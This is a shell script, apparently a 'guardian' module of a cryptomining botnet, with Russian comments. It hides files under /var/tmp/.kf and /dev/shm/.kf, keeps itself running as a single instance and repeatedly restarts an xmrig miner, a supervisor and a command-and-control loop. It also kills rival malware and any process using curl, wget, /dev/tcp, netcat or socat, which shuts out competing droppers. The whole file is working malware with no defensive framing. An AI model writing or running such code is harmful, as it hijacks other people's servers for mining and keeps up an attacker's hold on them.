#!/bin/sh
# guardian.sh — сторож: singleton, самолечение, зачистка чужих дропперов.
# Скан /proc каждые 0.2 с. Чужой fetch/шелл убивается на 10-м обнаружении.
# Совместим с fleet-agent.sh: работает с $D/svc.sh, $D/loop.sh, $D/xmrig, $D/c2list.
#
# Запуск: sh guardian.sh

D=/var/tmp/.kf
S=/dev/shm/.kf
PIDF="$D/.gpid"
MARK="${KF_MARK:-kf9}"

alm() { for p in /proc/[0-9]*; do pid=${p#/proc/}; c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline"); case "$c" in *"$1"*) return 0;; esac; done; return 1; }

# --- singleton ---------------------------------------------------------------
if [ -f "$PIDF" ]; then
  old=$(cat "$PIDF" 2>/dev/null)
  if [ -n "$old" ] && [ -r "/proc/$old/cmdline" ]; then
    c=$(tr '\0' ' ' 2>/dev/null <"/proc/$old/cmdline")
    case "$c" in *guardian.sh*) exit 0 ;; esac
  fi
fi
for p in /proc/[0-9]*; do
  pid=${p#/proc/}
  [ "$pid" = "$$" ] && continue
  c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline")
  case "$c" in *guardian.sh*) exit 0 ;; esac
done
echo "$$" > "$PIDF" 2>/dev/null
chmod 600 "$PIDF" 2>/dev/null

EP=""
[ -f "$D/endpoint" ] && EP=$(cat "$D/endpoint" 2>/dev/null)
C2LIST=""
[ -f "$D/c2list" ] && C2LIST=$(cat "$D/c2list" 2>/dev/null)
WID="$MARK"
[ -s "$D/id" ] && WID=$(cat "$D/id" 2>/dev/null)

RIVAL='\.amq_|\.usr_4voh|beacon-dialer|\.kwork|\.nodebox|udev-helper|java_update|\.jvbd|\.sysjvd|\.scsi_eh|\.X0_lock|\.sysd-private|\.khp|nm-dog|MASKED_RUN|/dev/shm/\.'

i=0
while :; do
  i=$((i + 1))
  for p in /proc/[0-9]*; do
    pid=${p#/proc/}
    [ "$pid" = "$$" ] && continue
    c=$(tr '\0' ' ' 2>/dev/null <"$p/cmdline") || continue
    [ -n "$c" ] || continue

    case "$c" in *"$D"*|*"$S"*|*guardian.sh*) continue ;; esac
    if [ -n "$EP" ]; then case "$c" in *"$EP"*) continue ;; esac; fi

    printf '%s' "$c" | grep -qE "$RIVAL" && { kill -9 "$pid" 2>/dev/null; continue; }

    if printf '%s' "$c" | grep -qE 'curl|wget|dev/tcp|pty.spawn|nc -e|ncat|socat'; then
      key="s$pid"
      n=$(eval "echo \${$key:-0}")
      n=$((n + 1))
      eval "$key=$n"
      if [ "$n" -ge 10 ]; then kill -9 "$pid" 2>/dev/null; eval "unset $key"; fi
    fi
  done

  # самолечение: бинарь, майнер, супервизор, бекенд-цикл
  [ -x "$D/xmrig" ] || { cp "$S/xmrig" "$D/xmrig" 2>/dev/null && chmod 700 "$D/xmrig" 2>/dev/null; }
  if [ -s "$D/c.json" ] && ! alm "$D/xmrig -c"; then
    [ -x "$D/xmrig" ] && setsid nice -n 19 "$D/xmrig" -c "$D/c.json" $(cat "$D/flags" 2>/dev/null) >/dev/null 2>&1 &
  fi
  alm "$D/svc.sh m" || setsid sh "$D/svc.sh" m >/dev/null 2>&1 &
  alm "$D/loop.sh"  || setsid sh "$D/loop.sh" "$WID" $C2LIST >/dev/null 2>&1 &

  if [ $((i % 300)) -eq 0 ]; then echo "$$" > "$PIDF" 2>/dev/null; fi
  sleep 0.2 2>/dev/null || sleep 1
done
